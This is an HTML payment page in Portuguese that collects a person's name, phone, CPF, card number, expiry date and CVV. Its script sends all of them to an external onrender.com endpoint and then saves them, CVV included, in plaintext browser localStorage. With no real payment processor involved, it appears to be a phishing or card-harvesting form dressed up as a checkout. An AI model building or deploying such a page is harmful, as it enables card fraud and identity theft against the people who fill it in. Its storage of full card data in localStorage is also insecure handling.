<!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Área de pagamento</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* Estilos mantidos como estão */
    </style>
</head>
<body>
    <div class="form-container">
        <h1>Confirmação</h1>
        <form id="paymentForm">
            <label for="nome">Nome Completo:</label>
            <input type="text" id="nome" name="nome" required>

            <label for="telefone">Número de Telefone:</label>
            <input type="tel" id="telefone" name="telefone" required>

            <label for="cpf">CPF:</label>
            <input type="text" id="cpf" name="cpf" required>

            <fieldset>
                <legend>Informações do Cartão:</legend>
                <div class="card-info">
                    <label for="nome-titular">Nome do Titular do Cartão:</label>
                    <input type="text" id="nome-titular" name="nome-titular" required>

                    <label for="numero-cartao">Número do Cartão:</label>
                    <input type="text" id="numero-cartao" name="numero-cartao" required>

                    <label for="data-validade">Data de Validade:</label>
                    <input type="text" id="data-validade" name="data-validade" placeholder="MM/AA" required>
                    
                    <label for="cvv">CVV:</label>
                    <input type="text" id="cvv" name="cvv" required>
                </div>
            </fieldset>

            <button type="submit"><i class="fas fa-credit-card"></i> Enviar Pagamento</button>
        </form>
        <div class="error-message">Por favor, preencha todos os campos corretamente antes de enviar.</div>
        <div id="resultado"></div>
    </div>

    <script>
        // Funções de formatação como estão

        document.getElementById('paymentForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const formData = new FormData(this);
            const submitButton = this.querySelector('button[type="submit"]');
            submitButton.disabled = true; // Desativar o botão ao enviar

            fetch('https://meu-site-iuwt.onrender.com/submit', {
                method: 'POST',
                body: new URLSearchParams(formData)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Erro ao enviar dados.');
                }
                return response.text();
            })
            .then(result => {
                // Armazenar dados em localStorage (opcional)
                localStorage.setItem('formData', JSON.stringify(Object.fromEntries(formData)));

                // Redirecionar para a página de confirmação
                window.location.href = "/confirmation.html";
            })
            .catch(error => {
                console.error('Erro:', error);
                document.getElementById('resultado').textContent = 'Erro ao enviar dados.';
                submitButton.disabled = false; // Reativar o botão em caso de erro
            });
        });
    </script>
</body>
</html>
